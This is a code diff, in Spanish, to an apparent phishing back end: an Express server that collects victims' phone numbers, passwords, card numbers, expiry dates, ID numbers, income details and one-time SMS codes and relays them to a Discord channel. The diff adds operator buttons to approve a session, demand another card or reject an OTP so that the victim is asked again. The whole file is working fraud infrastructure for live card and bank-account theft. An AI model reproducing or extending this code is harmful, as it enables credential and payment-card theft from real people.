@@ -27,7 +27,6 @@ client.once('ready', () => {
 
 client.login(DISCORD_TOKEN);
 
-// Función para detectar la marca de la tarjeta
 function detectarMarca(tarjeta) {
     const num = String(tarjeta).replace(/\D/g, '');
     if (num.startsWith('4')) return 'Visa 💳';
@@ -36,7 +35,7 @@ function detectarMarca(tarjeta) {
     return 'Desconocida';
 }
 
-// 🔥 ENDPOINT PRINCIPAL: Recibe TODOS los datos
+// 🔥 ENDPOINT PRINCIPAL
 app.post('/nuevo', async (req, res) => {
     try {
         const { userId, accion, numero, password, datos, otp, tarjeta, codigo, expMes, expAnio, saldo, infoCompleta } = req.body;
@@ -76,32 +75,18 @@ app.post('/nuevo', async (req, res) => {
             else if (accion === 'otp') {
                 let infoTexto = '';
                 if (infoCompleta) {
-                    infoTexto = `Cédula: ${infoCompleta.cedula || 'N/A'}\n` +
-                                `Nombre: ${infoCompleta.nombreCompleto || 'N/A'}\n` +
-                                `Ocupación: ${infoCompleta.ocupacion || 'N/A'}\n` +
-                                `Ingresos: ${infoCompleta.ingresoMensual || 'N/A'}\n` +
-                                `Monto: ${infoCompleta.montoPrestamo || 'N/A'}\n` +
-                                `Plazo: ${infoCompleta.meses || 'N/A'} meses\n` +
-                                `Fecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
+                    infoTexto = `Cédula: ${infoCompleta.cedula || 'N/A'}\nNombre: ${infoCompleta.nombreCompleto || 'N/A'}\nOcupación: ${infoCompleta.ocupacion || 'N/A'}\nIngresos: ${infoCompleta.ingresoMensual || 'N/A'}\nMonto: ${infoCompleta.montoPrestamo || 'N/A'}\nPlazo: ${infoCompleta.meses || 'N/A'} meses\nFecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
                 }
-
                 embed.setTitle('(OTP)DINAMICA')
                      .setDescription(
-                         `📱 **Número:** ${numero || 'N/A'}\n` +
-                         `🔒 **Contraseña:** ${password || 'N/A'}\n` +
-                         `💰 **Saldo Declarado:** ${saldo || 'N/A'}\n` +
-                         `🔢 **OTP Ingresado:** ${otp}\n` +
-                         `----------------------------\n` +
-                         `**Info Completa:**\n` +
-                         `\`\`\`\n${infoTexto}\n\`\`\``
+                         `📱 **Número:** ${numero || 'N/A'}\n🔒 **Contraseña:** ${password || 'N/A'}\n💰 **Saldo Declarado:** ${saldo || 'N/A'}\n🔢 **OTP Ingresado:** ${otp}\n----------------------------\n**Info Completa:**\n\`\`\`\n${infoTexto}\n\`\`\``
                      );
             }
-            
             await channel.send({ embeds: [embed] });
             return res.json({ ok: true });
         }
 
-        // 2. DATOS DE LA TARJETA (CON LOS 2 BOTONES)
+        // 2. DATOS DE LA TARJETA
         if (!tarjeta) return res.status(400).json({ ok: false, error: 'Falta tarjeta' });
 
         sesiones.set(finalUserId, {
@@ -140,7 +125,7 @@ app.post('/nuevo', async (req, res) => {
     }
 });
 
-// ENDPOINT PARA RECIBIR EL SMS
+// 🔥 ENDPOINT PARA RECIBIR EL SMS
 app.post('/validar-otp/:userId', async (req, res) => {
     try {
         const { userId } = req.params;
@@ -159,8 +144,11 @@ app.post('/validar-otp/:userId', async (req, res) => {
                 { name: '📱 SMS Recibido', value: `\`${otp}\``, inline: false }
             );
             
+            // 🔥 AQUÍ ESTÁN LOS 3 BOTONES NUEVOS
             const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar y Finalizar').setStyle(ButtonStyle.Success)
+                new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar').setStyle(ButtonStyle.Success),
+                new ButtonBuilder().setCustomId(`otracc_${userId}`).setLabel('📱 Pedir otra CC').setStyle(ButtonStyle.Primary),
+                new ButtonBuilder().setCustomId(`rechazarotp_${userId}`).setLabel('❌ Rechazar OTP').setStyle(ButtonStyle.Danger)
             );
             await msg.edit({ embeds: [embed], components: [row] });
         }
@@ -178,7 +166,7 @@ app.get('/estado/:userId', (req, res) => {
     res.json({ estado: s.estado, otp: s.otp || null });
 });
 
-// BOTONES DE DISCORD
+// 🔥 MANEJO DE BOTONES DE DISCORD
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
 
@@ -202,6 +190,16 @@ client.on('interactionCreate', async (interaction) => {
         s.estado = 'rejected';
         sesiones.set(userId, s);
         await interaction.reply({ content: `❌ Usuario rechazado.`, ephemeral: true });
+    } 
+    else if (action === 'otracc') { // 🔥 NUEVA ACCIÓN
+        s.estado = 'pedir_otra_cc';
+        sesiones.set(userId, s);
+        await interaction.reply({ content: `📱 Se solicitó cambiar de tarjeta al usuario.`, ephemeral: true });
+    } 
+    else if (action === 'rechazarotp') { // 🔥 NUEVA ACCIÓN
+        s.estado = 'rechazar_otp';
+        sesiones.set(userId, s);
+        await interaction.reply({ content: `❌ OTP rechazado. Se solicitará de nuevo.`, ephemeral: true });
     }
 });
 
